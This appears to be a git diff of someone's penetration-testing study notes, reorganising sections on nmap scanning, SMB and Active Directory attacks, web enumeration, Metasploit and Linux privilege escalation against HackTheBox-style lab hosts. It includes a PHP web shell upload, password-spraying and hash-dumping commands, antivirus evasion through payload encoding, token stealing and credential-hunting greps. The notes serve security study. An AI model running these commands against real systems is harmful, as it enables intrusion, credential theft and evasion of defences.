@@ -2,7 +2,7 @@
 
 ## General process
 
-1. **Initial guesses**: 
+1. **Password Spraying**: 
    - Empty authentication (Anonymous login)
    - Default authentication: 
      - Google: *service + default credentials*
@@ -16,8 +16,6 @@
        - Administrator
    - Password: (*password*, same as username)
    - Password reuse on other services
-2. **Password Spraying:**
-
    - Generate passwords with `pswgen`
 3. **Brute Forcing**
 
@@ -27,42 +25,11 @@
 
 **Cracking:** `hashid` ->  [crackstation](https://crackstation.net/)
 
-## Web
+# Network
 
-### Type Juggling
+## Enumeration
 
-PHP type juggling vulnerability occurs when a loose comparison operator  (== or!=) is used in the place of a strict comparison operator (===  or!==) in a situation where the attacker has access to one of the  variables being compared. 
-
-This vulnerability may cause the application to provide an unexpected  true or false response and may result in serious authorization and/or  authentication problems. 
-
-![image-20241021201733300](/home/damuna/.config/Typora/typora-user-images/image-20241021201733300.png)
-
-E.g. the following php code handling an authentication is vulnerable:
-
-```php
-if (strcmp($username , $_POST['username']) == 0) {
-	if (strcmp($password, $_POST['password']) == 0) {
-```
-
-To exploit it, one can change the POST data of the web request using BurpSuit in an empty array, since If we convert those variables into empty arrays ( `$username[] & $password[] `), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.
-
-## Hash
-
-Note that sometimes the credentials could be encrypted, in this case use `hashid` from the terminal to find out which kind of encryption is, and then use [crackstation](https://crackstation.net/) to try to crack it. 
-
-### Shadow Hash
-
-A shadow hash is the encrypted password of a local host. To crack it, we need the file /etc/passwd, which contains only the users with a local account.
-
-
-
-# Enumeration
-
-## nmap
-
-Locate and list servers, services connected to the ntework.
-
-### nmap: Host Discovery
+### Host Discovery
 
 Given one or more IP addresses, we want to see which ones are alive. To do this, we can use ICMP echo requests, and see which ones provide an ICMP reply to this. 
 
@@ -93,7 +60,7 @@ This scanning method works only if the firewalls of the hosts allow it.
 
 - `--packet-trace` Shows all packages sent and received
 
-### nmap: Service scanning
+### Service scanning
 
 The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defined otherwise and is also one of the most popular  scan methods. This scan method makes it possible to scan several  thousand ports per second. The TCP-SYN scan sends one packet with the  SYN flag and, therefore, never completes the three-way handshake, which  results in not establishing a full TCP connection to the scanned port.
 
@@ -104,16 +71,27 @@ The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defi
 #### **nmap options:**
 
 - `-sC` parameter to specify that `Nmap` scripts should be used to try and obtain more detailed information. Also runs some default scripts
+
 - `-sV` show the versions (banner grabbing)
+
 - `-p-` all ports
+
 - `--disable-arp-ping`: Disables ARP requests, so the scan doesn't switch to ARP requests when scanning local networks.
+
 - `-Pn` disable the ICMP echo requests 
+
 - `-n` disable DNS resolution
+
 - `-A` aggressive scan
+
 - `--packet-trace` Shows all packages sent and received
+
 - `--version-trace` Show all version packages
+
 - `--version-all` (Try every single probe to determine the version)          
+
 - **protocols:**
+
   - `-sU` performs UDP scan
   - `-sS` SYN Scan: default
   - `-sT` Connect scan: sends a  `SYN` packet -> the port is open if it answers with  `SYN-ACK` packet and closed with an `RST` packet. 
@@ -123,8 +101,9 @@ The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defi
   - `-sA` ACK scan: much harder to filter for firewalls and IDS/IPS systems because they only send a TCP packet with only the ACK flag. 
 
   - `-O`: Performs operation system detection scan.
+
 - **Firewall / IDS usuful flags:**
-  
+
   - change protocol
   - `-D RND:5` Generates five random IP addresses that indicates the source IP the connection comes from.
   - `-S` Scans the target by using different source IP address.
@@ -132,7 +111,7 @@ The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defi
   - `--dns-server <ns>,<ns>`) to specify DNS servers. 
   - `--source-port 53` specify a source port  for our scans. 
   - `-T` specifies the timeing (`0` paranoid - `5` insane)
-  
+
 - `nmap --script <script name> -p <port> <host>` to run other scripts.
 
   `--script "dns-* and discovery and not intrusive"`: this uses all the dns related scripts in the category discovery and not in the category intrusive. Here all the categories:
@@ -157,14 +136,16 @@ The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defi
 #### **nmap output**
 
 - **`open`:** Connection to the scanned port has been established. These connections can be **TCP connections**, **UDP datagrams** as well as **SCTP associations**.
-  
+
   - If the UDP port is `open`, we only get a response if the application is configured to do so.
-  
+
 - **`closed`:** 
+
   - The TCP protocol indicates that the packet we received back contains an `RST` flag. 
   - In the UDP scan, if we get an ICMP response with `error code 3` (port unreachable), we know that the port is indeed closed.
-  
+
 - **`filtered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because:
+
   - the package was *dropped*: Nmap receives no response, and by default will resend the request, by setting the retry rate (`--max-retries`) to 10. 
   - A *firewall* reject the package: As a response, we could get one of the following error messages:
     - Net Unreachable
@@ -173,10 +154,11 @@ The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defi
     - Host Prohibited
     - Port Unreachable
     - Proto Unreachable
-  
+
 - **`unfiltered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because either *no response is returned* from the target for the  port or we get *an error code* from the target.
 
 - **`open|filtered`:** If we do not get a response for a specific port, `Nmap` will set it to that state. This indicates that a firewall or packet filter may protect the port.
+
   - In UDP scan if the ICMP response was neither open nor closed, it will be marked as `open|filtered.
 
 - **`closed|filtered`:** This state only occurs in the **IP ID idle** scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.
@@ -212,7 +194,7 @@ Here some way to deal with them:
 
 - If the firewall accepts `TCP port 53`, it is very likely that IDS/IPS filters might also be configured much  weaker than others. We can test this by trying to connect to this port  by using `Netcat`.
 
-## Fingerprinting
+### Version Fingerprinting
 
 Get as much information about server and network
 
@@ -241,7 +223,9 @@ Get as much information about server and network
   - v3: security measure, encryption and authentication
   - [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.
 
-## Services
+## Service Hacking
+
+### Service Types
 
 **Services:**
 
@@ -259,11 +243,6 @@ Get as much information about server and network
 - 21, 2121 -> FTP
 - 22, 2222 -> SSH
 - 1433, 3306, 5432, 27017 -> DB: MsSQLS, MySQL, PSQL, Mongo
-
-# Network
-
-## Service Hacking
-
 
 ### 21 - FTP
 
@@ -827,11 +806,59 @@ In the documentation of Dovecot, we can find the individual [core settings](http
   - `seq 500 1100` generates a sequence of numbers from 500 to 1100
   - `-c "queryuser 0x$(printf '%x\n' $i)"`: Executes the `queryuser` command to query information about a user by their RID (Relative Identifier)
 
--  [SMBMap](https://github.com/ShawnDEvans/smbmap)
+- `mount
+
+  - ```bash
+    sudo mkdir /tmp/share
+    sudo mount -t cifs -o username=[],password=[],domain=. //192.168.220.129/share /tmp/share
+    ```
+
+- [SMBMap](https://github.com/ShawnDEvans/smbmap)
 
 - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
-#### Navigation:
+-  Windows `CMD`
+
+  - ```cmd-session
+    # Display Share and connect
+    net use n: \\192.168.220.129\Share /user:user pass
+    
+    # Search for file name
+    dir n:\*[STRING]* /s /b	
+    
+    # Search for string in file
+    findstr /s /i cred n:\*.*
+    ```
+
+    Some string to search for:
+
+    - cred, password, users, secrets, key
+    - Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.
+
+- `Powershell`
+
+  - ```powershell-session
+    # Display share
+    Get-ChildItem \\192.168.220.129\share\
+    
+    # Connect with Anonymous
+    New-PSDrive -Name "N" -Root "\\192.168.220.129\share" -PSProvider "FileSystem"
+    
+    # Connect with credentials
+    $username = 'plaintext'
+    $password = 'Password123'
+    $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
+    $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+    New-PSDrive -Name "N" -Root "\\192.168.220.129\share" -PSProvider "FileSystem" -Credential $cred
+    
+    # Serch file name
+    Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
+    
+    # Search string in file
+    Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
+    ```
+
+- Navigation:
 
 - `smbclient -N //[IP ADDRESS]{/FOLDER}`
   
@@ -1485,7 +1512,95 @@ Once inside redis environment `info` return information about the  server
 - `keys *` List all the keys in the database
 - `get {key}`
 
+## Active Directory
 
+It is a collection of machines, called *clients*, handled by the *domain controller (DC)*, which is a master server of one domain, thus it creates one (and only one) domain. 
+
+The goal is to get local admin on the domain controller. 
+
+Port `88` is always open, since it hosts the DC, running a process called *Kerberos*. Kerberos is a way for users to authenticate in the network, even if they don't have an account for it.
+
+There could be multiple DCs. A *trust escalation* is a privilege escalation in which you go from a DC to the other, if they trust each other. The trivial one is the one from child to parent. 
+
+*Forest* is the parent of a collection of machines that has the same hierarchy.
+
+1. Through anonymous or guest authentication, try to get access to
+
+   - SMB
+
+   - RPC
+
+   - LDAP
+
+2. Get a list of valid usernames
+
+3. Password spraying
+
+   ```bash
+    nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce
+   ```
+
+   ```bash
+    nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce --local-auth
+   ```
+
+   ```bash
+   nxc smb 10.10.10.161 -u "" -p "" --pass-pol
+   ```
+
+   
+
+4. Get a session in WinRM
+
+5. If you cannot, Kerberos bruteforcing
+
+   ```bash
+   GetNPUsers.py htb.local/ -usersfile user.txt -request -dc-ip 10.10.10.161 
+   ```
+
+6. Dump and analyze th database
+
+   ```bash
+    bloodhound-python -u svc-alfresco -p s3rvice -ns 10.10.10.161 --domain htb.local -c All --zip --dns-tcp
+   ```
+
+   
+
+### nxc
+
+Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/
+
+`nxc [PROTOCOL] [TARGET] -u [USERNAME] -p [PASSWORD] --port [PORT] [OPTIONS]`
+
+To do *password spraying*, you can put a file instead of the username, with the most common ones, and using the `--continue-on-success` flag
+
+To enumerate the users, use th flag `--users` or `--active-users` for ldap.
+
+Possible protocols:
+
+	- ftp
+	- smb
+	- ssh
+	- vnc
+	- rdp
+	- winrm
+	- msSQL
+
+```bash
+windapsearch -d htb.local --dc-ip 10.10.10.161 --users --full > users.txt
+```
+
+### Hash Dumping
+
+If you have have administrator privileges, you can dump other users passwords hashes:
+
+`reg save hklm\sam sam`
+
+`reg save hklm\system system`
+
+Transfer the file on your device and run `samdump2 [system file] [sam file]`
+
+Also in meterpreter `hashdump` and `lsa_dump` could work.
 
 
 
@@ -1511,7 +1626,7 @@ Parameters are very important to spot, and they are grouped in different categor
 
   Parameters that are reflected, i.e. they appear in the request and in the response. 
 
-  - Template Injection (server or client side)
+  - Template Injection (SSTI / CSTI)
 
   - XXS/HTML Injection 
 
@@ -1541,74 +1656,23 @@ Parameters are very important to spot, and they are grouped in different categor
 
 ## Enumeration
 
-### Public domains
+### Fingerprinting
 
-#### DNS Subdomains
+- `web_enum [URL]`
+- Browser Extensions:
+  - Wappalyzer
+  - RetireJS
+  - Public Websites -> URLScan / WebCheck XYZ
 
-1. Manual search:
+### Crawling
 
-   - **SSL certificate**
+- `Burp Suite Spider`
+- `crawl [URL]`
 
-   - **DNS records** (public domain)
 
-     To display all the available DNS records:
+### Discovery
 
-     ```bash
-     dig any [DOMAIN]
-     ```
-
-     The records output will be divided in categories:
-
-     - `A` records: We recognize the IP addresses that point to a specific (sub)domain. 
-     - `MX` records: show which mail  server is responsible for managing the emails for the company. 
-     - `NS` records: show which name servers are used to resolve the FQDN to IP addresses. Most hosting  providers use their own name servers, making it easier to identify the hosting provider.
-     - `TXT` records: often contains verification keys for different third-party providers and other security aspects of DNS, such as [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), and [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), which are responsible for verifying and confirming the origin of the  emails sent.
-
-   - **Certificate Transparency (CT) logs:**  SSL certificate providers share the CT with the website https://crt.sh/, which stores everything in a database. FOr a deeper search: [Censys](https://search.censys.io/)
-
-     Certificate Transparency (CT) is an Internet security standard for monitoring and auditing the issuance of digital certificates. When an Internet user interacts with a website, a trusted third party  is needed for assurance that the website is legitimate and that the  website's encryption key is valid.
-
-     To look them up from the terminal and filter by unique subdomains:
-
-     ```bash
-      curl -s https://crt.sh/\?q\=[DOMAIN]\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist.txt
-     ```
-
-     Then one can grep the ones with an IP address:
-
-     ```bash
-     for i in $(cat subdomainlist);do host $i | grep "has address" | grep [DOMAIN]| cut -d" " -f4 >> ip-addresses.txt;done
-     ```
-
-     And use [Shodan](https://www.shodan.io/) to find devices and systems permanently connected to the Internet like `Internet of Things` (`IoT`). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria.
-
-     ```bash
-     for i in $(cat ip-addresses.txt);do shodan host $i;done
-     ```
-
-     Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 
-
-   - `WHOIS` (public)
-
-     ```bash
-     whois [DOMAIN]
-     ```
-
-   - [Wayback Machine](https://web.archive.org/)
-
-     It allows users to "go back in time" and view snapshots of websites as they appeared at various points in their history.
-
-2. Fuzzing:
-
-   ```bash
-   ffuf -u "http://searcher.htb" -H "Host: FUZZ.searcher.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac -acs advanced -mc all
-   ```
-
-3. Add DNS Server to the `/etc/resolv.conf` file.
-
-### VHosts
-
-#### Generalities
+#### VHosts
 
 - Purpose:
 
@@ -1621,50 +1685,25 @@ Parameters are very important to spot, and they are grouped in different categor
   - `Virtual Hosts` (`VHosts`): Virtual hosts are  configurations within a web server that allow multiple websites or  applications to be hosted on a single server. They can be associated  with top-level domains (e.g., `example.com`) or subdomains (e.g., `dev.example.com`). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.
 
 - Types:
+
   - Name-based: relies solely on the `HTTP Host header` to distinguish between websites.
   - IP-based
   - Port-based
 
-#### Vhosts Fuzzing
-
-AFTER FINDING A VHOST REPEAT THE FUZZING-> ADD 
+**Fuzzing**
 
 ```bash
-ffuf -mc all -ac -acs advanced -u [URL] -c -w [WORDLIST] -H "Host: FUZZ.[DOMAIN]]"
+vhost [URL]
 ```
 
-### Crawling
+Add found subdomains to `/etc/hosts` and scan recursively
 
-1. `Burp Suite Spider`:  
-
-2. `OWASP ZAP (Zed Attack Proxy)`: 
-
-3. `ReconSpider (Python Framework)`:
-
-   ```bash
-   python3 ReconSpider.py [URL]
-   ```
-
-4. `Apache Nutch (Scalable Crawler)`:
-
-### Automatic Recon
-
-- [FinalRecon](https://github.com/thewhiteh4t/FinalRecon): 
-
-- [Recon-ng](https://github.com/lanmaster53/recon-ng): 
-
-- [theHarvester](https://github.com/laramies/theHarvester): 
-
-- [SpiderFoot](https://github.com/smicallef/spiderfoot): 
-
-- [OSINT Framework](https://osintframework.com/): 
-
-### Directories and files
+#### Directories and files
 
 Gbuster or Ffuf to discover hidden files or directories
 
 ```bash
-gobuster dir -u {IP} -w {/usr/share/seclists/Discovery/Web-Content/WORDLIST}
+dirfuzz [URL]
 ```
 
 -  **HTTP status code** 
@@ -1728,40 +1767,15 @@ gobuster dir -u {IP} -w {/usr/share/seclists/Discovery/Web-Content/WORDLIST}
   - `mta-sts.txt`
 
     Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.
+  
+- `/.git`
 
-### Fingerprinting
+  Hashes of a git folder. To reconstruct it:
 
-**Banner Grabbing**:
+  ```bash
+  git-dumper [URL] [OUTPUT DIR]
+  ```
 
-```bash
-curl -IL {URL}
-```
-
-
-
-| Tool         | Description                                                  | Features                                                     |
-| ------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
-| `Wappalyzer` | Browser extension and online service for website technology profiling. | Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more. |
-| `BuiltWith`  | Web technology profiler that provides detailed reports on a website's technology stack. | Offers both free and paid plans with varying levels of detail. |
-| `WhatWeb`    | Command-line tool for website fingerprinting.                | Uses a vast database of signatures to identify various web technologies. |
-| `Nmap`       | Versatile network scanner that can be used for various reconnaissance tasks, including service and OS fingerprinting. | Can be used with scripts (NSE) to perform more specialised fingerprinting. |
-| `Netcraft`   | Offers a range of web security services, including website fingerprinting and security reporting. | Provides detailed reports on a website's technology, hosting provider, and security posture. |
-| `wafw00f`    | Command-line tool specifically designed for identifying Web Application Firewalls (WAFs). | Helps determine if a WAF is present and, if so, its type and configuration. |
-
-## Cloud
-
-`Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) 
-
-- DNS enumeration:
-
-  Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 
-
-- Google search:
-
-- Third-party providers 
-
-  -  [domain.glass](https://domain.glass) 
-  -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
 
 #### Amazon Buckets
 
@@ -1785,7 +1799,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ```
 
-## Exploit
+## Exploitation
 
 ### Proxy
 
@@ -1801,7 +1815,17 @@ gobuster vhost -u http://[DOMAIN] -w /usr/share/seclists/Discovery/DNS/subdomain
 
 Ignore any 400 Status output, since it means that the proxy refused your request.
 
-### Server-side Injections
+### Server-side
+
+#### File Read
+
+Linux:
+
+- `/etc/passwd`
+- ssh keys
+- web applications credentials
+  - where does the application save the passwords?
+- Opened services 
 
 #### SQL Injections
 
@@ -1907,6 +1931,25 @@ Even if the code is not directly executed, an error message can indicate what is
 
 ### Client-side
 
+#### Authentication
+
+##### Type Juggling
+
+PHP type juggling vulnerability occurs when a loose comparison operator  (== or!=) is used in the place of a strict comparison operator (===  or!==) in a situation where the attacker has access to one of the  variables being compared. 
+
+This vulnerability may cause the application to provide an unexpected  true or false response and may result in serious authorization and/or  authentication problems. 
+
+![image-20241021201733300](/home/damuna/.config/Typora/typora-user-images/image-20241021201733300.png)
+
+E.g. the following php code handling an authentication is vulnerable:
+
+```php
+if (strcmp($username , $_POST['username']) == 0) {
+	if (strcmp($password, $_POST['password']) == 0) {
+```
+
+To exploit it, one can change the POST data of the web request using BurpSuit in an empty array, since If we convert those variables into empty arrays ( `$username[] & $password[] `), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.
+
 #### XSS 
 
 - **Generalities:** 
@@ -1922,88 +1965,6 @@ Even if the code is not directly executed, an error message can indicate what is
   - [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) is the simplest variety of cross-site scripting. It arises when an  application receives data in an HTTP request and includes that data  within the immediate response in an unsafe way.
   - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (also known as persistent or second-order XSS) arises when an  application receives data from an untrusted source and includes that  data within its later HTTP responses in an unsafe way.        
   - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) (also known as [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)) arises when an application contains some client-side JavaScript that  processes data from an untrusted source in an unsafe way, usually by  writing the data back to the DOM.        
-
-# Active Directory
-
-It is a collection of machines, called *clients*, handled by the *domain controller (DC)*, which is a master server of one domain, thus it creates one (and only one) domain. 
-
-The goal is to get local admin on the domain controller. 
-
-Port `88` is always open, since it hosts the DC, running a process called *Kerberos*. Kerberos is a way for users to authenticate in the network, even if they don't have an account for it.
-
-There could be multiple DCs. A *trust escalation* is a privilege escalation in which you go from a DC to the other, if they trust each other. The trivial one is the one from child to parent. 
-
-*Forest* is the parent of a collection of machines that has the same hierarchy.
-
-1. Through anonymous or guest authentication, try to get access to
-
-   - SMB
-
-   - RPC
-
-   - LDAP
-
-2. Get a list of valid usernames
-
-3. Password spraying
-
-    ```bash
-     nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce
-    ```
-
-   ```bash
-    nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce --local-auth
-   ```
-
-   ```bash
-   nxc smb 10.10.10.161 -u "" -p "" --pass-pol
-   ```
-
-   
-
-4. Get a session in WinRM
-
-5. If you cannot, Kerberos bruteforcing
-
-   ```bash
-   GetNPUsers.py htb.local/ -usersfile user.txt -request -dc-ip 10.10.10.161 
-   ```
-
-6. Dump and analyze th database
-
-   ```bash
-    bloodhound-python -u svc-alfresco -p s3rvice -ns 10.10.10.161 --domain htb.local -c All --zip --dns-tcp
-   ```
-
-   
-
-## nxc
-
-Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/
-
-`nxc [PROTOCOL] [TARGET] -u [USERNAME] -p [PASSWORD] --port [PORT] [OPTIONS]`
-
-To do *password spraying*, you can put a file instead of the username, with the most common ones, and using the `--continue-on-success` flag
-
-To enumerate the users, use th flag `--users` or `--active-users` for ldap.
-
-Possible protocols:
-
-	- ftp
-	- smb
-	- ssh
-	- vnc
-	- rdp
-	- winrm
-	- msSQL
-
-```bash
-windapsearch -d htb.local --dc-ip 10.10.10.161 --users --full > users.txt
-```
-
-
-
-
 
 #  Shells
 
@@ -2201,7 +2162,7 @@ Staged payloads could lead to unstable shell sessions in these environments, so 
 - [Darkarmour](https://github.com/bats3c/darkarmour) is a tool to generate and utilize obfuscated binaries for use against Windows hosts.
 - [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with  network protocols directly. Some of the most exciting tools we care  about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
 
-### Linux
+### LinuxExploit
 
 
 
@@ -2237,6 +2198,135 @@ $ stty rows [] columns []
 
 
 
+## Metasploit
+
+Multiple sessions can be handled:
+
+in `msfconsole`:
+
+```bash
+sessions			# visualize active session
+sessions -i [no.]	# switch session
+```
+
+Background the current session with `[CTRL] + [Z]`
+
+The `jobs` command lets you handle active jobs:
+
+- An exploit can be run as a job by typing `exploit -j`
+- To list all running jobs  `jobs -l` 
+
+- To kill a specific job  `kill [index no.]` 
+- `jobs -K`  to kill all running jobs.
+
+
+
+### Modules
+
+In `msfconsole`:
+
+```bash
+search [exploit]
+
+use [number exploit]
+info
+options
+
+show target				# show OS/language version/service pack
+set target [alue]
+
+set [option] [value]	# use setg to set permanently
+
+run
+```
+
+In the search we can specify 
+
+- the  year (`cve:<year>`), 
+- the platform Windows (`platform:<os>`), 
+- the type of module we want to find (`type:<auxiliary/exploit/post>`), 
+- the reliability rank (`rank:<rank>`), 
+- the search name (`<pattern>`). 
+
+| **Type**    | **Description**                                              |
+| ----------- | ------------------------------------------------------------ |
+| `Auxiliary` | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
+| `Encoders`  | Ensure that payloads are intact to their destination.        |
+| `Exploits`  | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
+| `NOPs`      | (No Operation code) Keep the payload sizes consistent across exploit attempts. |
+| `Payloads`  | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
+| `Plugins`   | Additional scripts can be integrated within an assessment with `msfconsole` and coexist. |
+| `Post`      | Wide array of modules to gather information, pivot deeper, etc. |
+
+#### Import module
+
+To import an exploit from `searchsploit`:
+
+```bash
+searchsploit [exploit]	#get exploit path
+cd /usr/share/metasploit-framework/modules
+mkdir [exploit path]	# create the full exploit path inside msf
+cd [exploit path]
+searchsploit -m [exploit_number]	# copies the exploit
+msfconsole
+	>use [exploit path]
+```
+
+### Payloads
+
+Module that aids the exploit module in (typically) returning a shell to the attacker. Whether or not a payload is staged is represented by `/` in the payload name.
+
+- Singles: contains the exploit and the entire shellcode 
+- Stagers: staged payload that  typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. 
+- Stages: payload components that are downloaded by stager's modules.
+
+in `msfconsole`
+
+```bash
+grep [search value 1] grep [search value 2] show payloads
+set payload [no.]
+
+show options
+show encoders 	# See below
+run
+```
+
+#### Encoders
+
+Encoders change the payload to:
+
+-  run on different operating systems and architectures. 
+-  remove hexadecimal opcodes known as `bad characters`.
+-  help with the AV detection
+
+Shikata Ga Nai (`SGN`) is one of the most utilized Encoding.
+
+`msfvenom` takes care of payload generation and Encoding, by adding the flag `-e`, e.g. if the architecture is `x86`:
+
+```bash
+-e x86/shikata_ga_nai
+```
+
+Also, the flag `-i [number of iteration]` is useful to run the encoding multiple times, in order to evade AV.
+
+To test if your malware is undetectable (FUD) enough: https://antiscan.me/
+
+### Plugins
+
+Found in `/usr/share/metasploit-framework/plugins`
+
+In `msfconsole`:  -> `load [plugin]`
+
+### Meterpreter migration (Windows)
+
+in `meterpreter`, when the shell doesn't appear:
+
+```bash
+ps		# List processes
+steal_token [PID of process network or local service]
+```
+
+
 
 ## Verify code execution
 
@@ -2260,138 +2350,265 @@ $ stty rows [] columns []
 
 One excellent resource is [HackTricks](https://book.hacktricks.xyz), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. 
 
-## Scripts
+**Scripts**
 
 - Linux
   - [Linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (enum)
-  -  [LinEnum](https://github.com/rebootuser/LinEnum.git) (enum)
-  -  [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (enum)
+  - [LinEnum](https://github.com/rebootuser/LinEnum.git) (enum)
+  - [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (enum)
   - [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
 - Windows
   -  [Seatbelt](https://github.com/GhostPack/Seatbelt) (enum)
   -  [JAWS](https://github.com/411Hall/JAWS) (enum)
-  - [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+  -  [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
 
 ## Linux
 
-### Kernel Exploits
+### Users
 
-Unpatched/older versions of Linux/Windows
+- Users `cat /etc/passwd | grep sh` and `ls  /home`
+- User Group:
 
-### Vulnerable Software
+  -  `id` and what can that group do
+  -  [interesting_groups](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe)
 
-Installed software: we can use the `dpkg -l` command on Linux or look at `C:\Program Files` in Windows to see what software is installed on the system.
+### Privileges
 
-### User Privileges
+Search on [gtfobins](https://gtfobins.github.io) bin files with relative privileges
 
-- `sudo -l`: check sudo privileges
-  - `sudo su` to switch to the root user `su [USER]` to switch to a local user
-  - The `NOPASSWD` entry shows if a certain application can be executed without password
-  - `sudo -u [USER] [COMMAND]` to execute an application as user and not as root
-- Once we find a particular application we can run with `sudo`, we can look for ways to exploit it to get a shell as the root user. 
-  - [GTFOBins](https://gtfobins.github.io) contains a list of commands and how they can be exploited through `sudo`. We can search for the application we have `sudo` privilege over, and if it exists, it may tell us the exact command we should execute to gain root access.
-  - [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user.
+#### sudo
 
-### Scheduled Tasks
+```bash
+sudo -l		 # List sudo privileges
 
-Scripts that run at specific intervals to carry out a task. To take advantage:
+sudo su 	 # Switch to the root user 
+su [USER] 	 # Switch to a local user
+sudo -u [USER] [COMMAND] 	# Execute an application as an user
+```
 
-- **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
+- **Symlinks attacks**
+
+  A symlink is a link to a file `ln -s [FILE_target] [FILE_link]`
+
+  The `*` character gets expanded to all the matching files.
+
+  **Examples**
+
+  - `chown` and `chmod`
+
+    - `chown [USER] [FILE]`
+
+      Sets the owner of the specified `[FILE]` to the `[USER]`.
+
+    - `chown [USER] [FILE] --reference=[REF FILE]`
+
+      Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.
+
+    ```bash
+    # Create a file reference owned by us
+    touch reference
+    # Create a file called as the flag of chown
+    touch -- --reference=reference
+    ```
+
+    If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.
+
+  **Avoid checks:**
+
+  - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:
+
+    ```bash
+    ln -s /root/root.txt [FILE HOP]	# Creates a link to root.txt
+    ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
+    ```
+
+#### suid
+
+- `find / -perm -u=s -type f 2>/dev/null`: checks for *SUID binaries* 
+
+### Credential Hunting
+
+- Some files worth checking:
+
+  - `configuration` files
+  - `log` files, 
+  - `bash_history` 
+
+- Search credentials in folder and subfolders:
+
+  ```bash
+  grep -rniH "[STRING]" [PATH] [-e REGEX]
+  ```
+
+  - `-r` recursive
+  - `-n` output the line number
+  - `-i` case insensitive
+  - `-H`  output the content
+
+  Credentials are variable assignments, which are made of:
+
+  - name: password, credential, pass, psw, token, key, secret
+  - separator: =, : (with or without space)
+  - quotes
+
+  Some examples:
+
+  ```bash
+  grep -rniH "password = '" .		# string assignment (try also with \")
+  grep -rniH "password':" . 		# dictionary assignment
+  grep -rniH "password'," .		# tuple assignment
+  ```
+
+- Shadow Hashes
+
+  A shadow hash is the encrypted password of a local host. To crack it, we need the file /etc/passwd, which contains only the users with a local account.
+
+### Files
+
+- Readable / Owned web files (for web application)
+
+  - `find /var/www -type f -group [group] 2>/dev/null`  
+
+  - `find /var/www -type f -user [user] 2>/dev/null`
+
+  - `find /var/www -type f -readable 2>/dev/null`
+
+  - `/proc` and `sis` `run` not interesting
+
+- Scheduled Tasks:
+
